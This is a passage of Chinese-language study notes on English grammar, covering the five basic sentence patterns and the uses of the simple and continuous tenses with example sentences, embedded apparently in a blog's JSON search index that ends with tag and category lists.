句型二：主语+谓语该句型的谓语动词是不及物动词，所表示的动作没有对象，其本意的意思完整，后面不需要带宾语。 He died. There children are playing. 这种动词后面虽然不接宾语，但通常会接副词（hard）或介词短语（如 in the west）来说明动作方式、地点或时间。这种修饰动作的成分称为状语。 He sun sets in the west. He works hard. He died in 2007. 区分”主系表“和”主谓状“，shouted 是不及物动词，副词 loudly 修饰动作，作状语。looks 是系动词，没有具体的动作。 He looks happy. He shouted loudly. 句型三：主语+谓语+宾语该句型的谓语动词是及物动词，这种动词告诉我由主语发出的动词所作用的对象是什么，这里的对象就是我们所称为的宾语。 These children are playing basketball. 对比一下 These children are playing basketball.（play及物动词） These children are playing.（play不及物动词） 其他修饰 I love English. I like chatting on the internet. 介词短语 on the internet 修饰 chatting He speaks English well. 副词 well 修饰 speaks，作状语 句型四：主语+谓语+间接宾语+直接宾语该句型的谓语动词是双宾动词，这种动词的后面所接的成分有”人“又有”物“。一般来讲， 这里的”人“表示动作的接受者，称做间接宾语。 ”物“表示动作的作用对象，是动作的承受者，称作直接宾语。 例子： Chatting online will bring you a lot of fun. He lent me ten yuan. I will buy you a mea. He showed the guard his passort. 句型五：主语+谓语+宾语+宾语补足语该句型的谓语动词是宾补动词，这种动词的后面接宾语，而此宾语的后面有接补充说明的宾语的补足语。宾语和宾语补足语和起来叫作复合宾语。 We can call Internet addicts a Webaholic. We elected John chairman. I found this answer wrong. 如何区”主语+谓语+间接宾语+直接宾语“和”主语+谓语+宾语+宾语补足语“，只要在宾语的后面加上 be 动词，如果能构成一个句子则是补足语。 I made John our chairman. 在宾语后面添加一个 is，即 John is our chairman，这说的通，这个是补足语。 I made John a cake. 在宾语后面添加一个 is，即 John is a cake*，这说不通，这个是个双宾语。 英文时态：一般时态英文时态体系1、英文时态构成：四时四态 tense（时）：用来规定事物的发生时间 现在时（present） 过去时（past） 将来时（future） 过去将来时（past futre） aspect（态）：用来规定动作的完整程度，反映说话者对事物的态度 一般体（simple） 进行体（continuous） 完成体（perfect） 完成进行体（perfect continuous） 动作标示时间标示 一般 进行 完成 完成进行 现在 现在一般时work/works 现在进行时am/is/are working 现在完成时has/have worked 现在完成进行时has/have been working 过去 过去一般时worked 过去进行时was/were working 过去完成时had worked 过去完成进行时had been working 将来 将来一般时will work 将来进行时will be woking 将来完成时will have worked 将来完成进行时will have been working 过去将来 过去将来一般时would work 过去将来进行时would be woking 过去完成时would have worked 过去将来完成时would have been working 一般现在时：并非表示现在一般现在时态的思维本质特征是：表示过去到现在直至将来的一段时间内发生的动作或存在的动作，具体表示： 不受时间限制的科学事实、客观真理、言语格言以及概括、结论、观点等 表示人们日常生活习惯及重复活动 1、用法一：表示普遍的事实或真理 Water consists of hydrogen and oxygen. The world is round. Knowledge is power. 2、用法二：表示重复活动 a) 表示习惯动作 He ofter goes to the gym. I go to the gym twice a week. b) 表示习惯状态 I like rie for dinner.（我喜欢晚餐吃米饭） 这一些用法通常和一些表示动作频率的时间副词连用 表示肯定的频率副词：always, frequently, usually, sometimes, generally, occasionally, ofter 表示否定频率的副词：never, seldom, rarely 表示频度副词短语：once a week, twice a year 具体如下： 如果在句子中通常是：在 be 动词后、实意动词前 He is always late.（他总是迟到） He always goes to school by bike. 上面否定频率副词不能再与否定助动词（don’t）连用 He doesn’t seldom come late.*（一般不这样说） He seldom come late. 这些副词一般放在否定助动词前面（always除外） The history lectures sometimes aren’t interesting. His wife complains that he sometimes does’t listen to her. He doesn’t always leaver before 6 o’clock. Sometimes he works until 7 o’clock. 3、用法三：一般现在时表示正在发生的动作 a) 一般现在时态在以 there 或 here 开头的句子中，表示目前的短暂的动作 Here comes your wife.（你妻子来了） There goes our bus; we’ll have to wait for the next one.（我们的车开走了，我们只好等下一辆） b) 表示现在瞬间的动作 The woman is a spy, now she enters the room, opens the drawer, takes out a pistol and slips it into her pocket. 4、用法四：一般现在时态表示将来发生的动作 a) 用在条件状语从句和时间状语从句中 主要用在条件状语从句中（if 和 unless）和时间状语从句中（when, as soon as, before）中，表示将来的动作 Please let me know when he comes back. I‘ll be glad if she comes over to visit me. I’ll give the book to him as soon as I see him. 不过从句的动作含有“意愿”的意思，则从句可用will。 if you will give me a hand with those books, I’ll appreciate it. If you will continue to flight, the victory will certainly be yours. 一般过去时态：被遗忘的一般过去时态说起一般过去时态，人们通常认为很简单，不就是表示过去发生的动作吗？其实不然。 1、 基本用法一：过去发生的短暂的动作或状态 一般过去时常表示过去某一个特定的时间所发生的动作或存在的状态，此时常和表示过去的特定时间状态连用，这些状语有：yesterday, yesterday evening, last night, last year 等等。这些不需要加介词，at last night*。 I saw him in the library yesterday morning. I began to learn English ten years ago. 2、基本用法二：过去发生的重复或延续活动 I slept for eight hours last night. She lived in our town for three years, but now she is living in BeiJing. I lived in the country for ten years. 区别： She lived in our town for three years.（她在我们小镇上生活过三年（但现在不在这里）） She has lived in our town for three years.（她在我们小镇上已经生活了三年（现在还在这里）） 3、口语用法一：“我不知道” “I don’t know” 和 “I didn’t know” I don’t know表示一直都不知道，以及现在时态情况下 I didn’t know表示之前不知道，现在知道了 4、口语用法二：“我忘记了” “I forget” 和 “I forgot” I forget the meaning of the word. I forgot to bring your walkman back. 一般将来时态：预测、计划和意愿严格来讲英文里没有将来时态，只有现在时态和过去时态。 It will rain later.（过一会会下雨） It may rain later.（过会可能会下雨） It may rain later.（过会或许会下雨） 1、will 表示将来：预测 a) 关于科技方面的预测 Will we travel to the stars?（我们能够进行星际旅行吗？） Will we discover another universe? b) 关于人类如何生活的预测 Will we still have privacy? What will we wear? 2、be going to 表示将来：预测 With all of these typos in this resume, you are not going to make a very good impression. 3、be going to 表示计划，will 表示意愿 4、现在进行时表示将来 现在进行时可以表示对最近的将来做出的计划或安排。 I am flying to Beijing next Monday.（我下周一要分北京） 英文时态：进行时态在英文中，进行时态的构成是 be + doing 这里的 be 动词不是系动词，而是助动词，因而没有“是”的意思。 三种进行时态： 现在进行时 I am doing he/she/it is doing we/you/they are doing 过去进行时 I/he/she/it was doing we/you/they were doing 将来进行时 will be doing 表示正在发生的动作： I am watching CCTV news right now. I am watching CCTV news when he arrived yesterday. I will be watching CCTV news at 7:15 pm tomorrow. 现在进行时：不一定正在进行1、表示正在进行的动作 What program are you watching? I am watching Friends. 2、在目前一段时间内持续的一种短暂的情况 I am not teaching English this month, I am working on a special project. 3、用于表示改变，强调逐渐改变的过程 It’s getting dark.（天逐渐暗下来） My dream is coming true. 4、表示安排 I’m getting married. 过去进行时：回顾过去讲的故事1、常见用法：用来设置故事背景 I was watching TV when the telephone rang. I was walking past the car when it expoloded. 2、少见用法：两个过去同时在持续的动作 While I was studing in my dorm, my roommates wrer talking loudly with therir friends. 3、典型用法：描述过去的特定时刻正在发生的事 I was discussing my thesis with my director at this time last night. 4、口语用法：表示委婉的请求或提建议 I was wondering if you’re like to lend me your car. 将来进行时：想象未来1、典型用法：将来某一时刻正在持续的事 Don’t telephoe me after eight tomorrow, I’ll be having a meeting. 进行时态的核心含义进行时态的核心意义在于表示： 事件具有持续性：进行时态首先表示一个事件或活动在某个特定的时间正在持续 时间具有短暂性：即表明事件的持续时间是有限的 时间未完成： 1、进行时态与一般动作对比 a) 活动与状态对比 I am thinging about the answer.（我正在思考答案） I thank it is 144.（我认为答案是144） b) 发生在说话那一刻的一个动作与一个习惯对比 Why are you wearing glasses?（你怎么戴着眼镜？） Why do you wear glasses?（你怎么习惯戴眼镜？） c) 具体的事件与概括描述对比 Weeds are grows like wildfire in my garden.（在我家的花园里，杂草正在疯长） Weeds grow like wildfire.（杂草一般都会疯涨） d) 暂时性的时间与长期状态对比 Joan is singing well.（Joan 这次唱得很好） Joan sings well.（joan 歌唱得很好） e) 未完成与完成对比 He was drowning in the lake, so the lifeguard raced into the wather. He drowned in the lake. 2、不适用的情形 a) 不能在进行时态的同一时间内做不同的事 I am painting the room and cooking dinner.* （这两个动作不能同时完成） I am painting the room and will cook dinner. I was having dinner and watching the news.（这个两个动作可以同时完成） b) 不能进行时态表示活动的次数 I was ringing the bell six times.* I ring the bell six times.（我按门铃6次）","link":"/1000/04/06/%E8%8B%B1%E8%AF%AD%E8%AF%AD%E6%B3%95%E6%96%B0%E6%80%9D%E7%BB%B4%EF%BC%88%E4%B8%80%EF%BC%89/"}],"tags":[{"name":"cache","slug":"cache","link":"/tags/cache/"},{"name":"二进制","slug":"二进制","link":"/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"计算机基础","slug":"计算机基础","link":"/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"},{"name":"位运算","slug":"位运算","link":"/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"},{"name":"DDD","slug":"DDD","link":"/tags/DDD/"},{"name":"PostgreSQL","slug":"PostgreSQL","link":"/tags/PostgreSQL/"},{"name":"Docker","slug":"Docker","link":"/tags/Docker/"},{"name":"反射","slug":"反射","link":"/tags/%E5%8F%8D%E5%B0%84/"},{"name":"多线程","slug":"多线程","link":"/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"name":"线程通信","slug":"线程通信","link":"/tags/%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1/"},{"name":"转载","slug":"转载","link":"/tags/%E8%BD%AC%E8%BD%BD/"},{"name":"Full-Text Search","slug":"Full-Text-Search","link":"/tags/Full-Text-Search/"},{"name":"英文","slug":"英文","link":"/tags/%E8%8B%B1%E6%96%87/"},{"name":"LRUCache","slug":"LRUCache","link":"/tags/LRUCache/"},{"name":"shell","slug":"shell","link":"/tags/shell/"},{"name":"Spring","slug":"Spring","link":"/tags/Spring/"},{"name":"注解","slug":"注解","link":"/tags/%E6%B3%A8%E8%A7%A3/"},{"name":"源码","slug":"源码","link":"/tags/%E6%BA%90%E7%A0%81/"},{"name":"ThreadLocal","slug":"ThreadLocal","link":"/tags/ThreadLocal/"},{"name":"InheritableThreadLocal","slug":"InheritableThreadLocal","link":"/tags/InheritableThreadLocal/"},{"name":"TransmittableThreadLocal","slug":"TransmittableThreadLocal","link":"/tags/TransmittableThreadLocal/"},{"name":"OOP","slug":"OOP","link":"/tags/OOP/"},{"name":"Seata","slug":"Seata","link":"/tags/Seata/"},{"name":"堆排序","slug":"堆排序","link":"/tags/%E5%A0%86%E6%8E%92%E5%BA%8F/"},{"name":"lintcode","slug":"lintcode","link":"/tags/lintcode/"},{"name":"比特币","slug":"比特币","link":"/tags/%E6%AF%94%E7%89%B9%E5%B8%81/"},{"name":"数字加密","slug":"数字加密","link":"/tags/%E6%95%B0%E5%AD%97%E5%8A%A0%E5%AF%86/"},{"name":"汇编","slug":"汇编","link":"/tags/%E6%B1%87%E7%BC%96/"},{"name":"gdb","slug":"gdb","link":"/tags/gdb/"},{"name":"浮点数","slug":"浮点数","link":"/tags/%E6%B5%AE%E7%82%B9%E6%95%B0/"},{"name":"JVM","slug":"JVM","link":"/tags/JVM/"},{"name":"ProducerConsumer","slug":"ProducerConsumer","link":"/tags/ProducerConsumer/"},{"name":"设计模式","slug":"设计模式","link":"/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"Java8","slug":"Java8","link":"/tags/Java8/"},{"name":"lambda","slug":"lambda","link":"/tags/lambda/"},{"name":"Go","slug":"Go","link":"/tags/Go/"},{"name":"锁","slug":"锁","link":"/tags/%E9%94%81/"},{"name":"Future","slug":"Future","link":"/tags/Future/"},{"name":"SPI","slug":"SPI","link":"/tags/SPI/"},{"name":"并发编程","slug":"并发编程","link":"/tags/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"},{"name":"NIO","slug":"NIO","link":"/tags/NIO/"},{"name":"Reactor","slug":"Reactor","link":"/tags/Reactor/"},{"name":"synchronized","slug":"synchronized","link":"/tags/synchronized/"},{"name":"英语","slug":"英语","link":"/tags/%E8%8B%B1%E8%AF%AD/"},{"name":"语法","slug":"语法","link":"/tags/%E8%AF%AD%E6%B3%95/"}],"categories":[{"name":"CSAPP","slug":"CSAPP","link":"/categories/CSAPP/"},{"name":"DDD","slug":"DDD","link":"/categories/DDD/"},{"name":"Go","slug":"Go","link":"/categories/Go/"},{"name":"Java 基础","slug":"Java-基础","link":"/categories/Java-%E5%9F%BA%E7%A1%80/"},{"name":"算法","slug":"算法","link":"/categories/%E7%AE%97%E6%B3%95/"},{"name":"linux","slug":"linux","link":"/categories/linux/"},{"name":"Spring","slug":"Spring","link":"/categories/Spring/"},{"name":"源码","slug":"源码","link":"/categories/%E6%BA%90%E7%A0%81/"},{"name":"Java","slug":"Java","link":"/categories/Java/"},{"name":"JAVA","slug":"JAVA","link":"/categories/JAVA/"},{"name":"分布式","slug":"分布式","link":"/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"},{"name":"区块链","slug":"区块链","link":"/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"计算机基础","slug":"计算机基础","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"},{"name":"深入理解Java虚拟机","slug":"深入理解Java虚拟机","link":"/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Java%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"设计模式","slug":"设计模式","link":"/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"面试","slug":"面试","link":"/categories/%E9%9D%A2%E8%AF%95/"},{"name":"Netty","slug":"Netty","link":"/categories/Netty/"},{"name":"Dubbo","slug":"Dubbo","link":"/categories/Dubbo/"},{"name":"英语笔记","slug":"英语笔记","link":"/categories/%E8%8B%B1%E8%AF%AD%E7%AC%94%E8%AE%B0/"}]}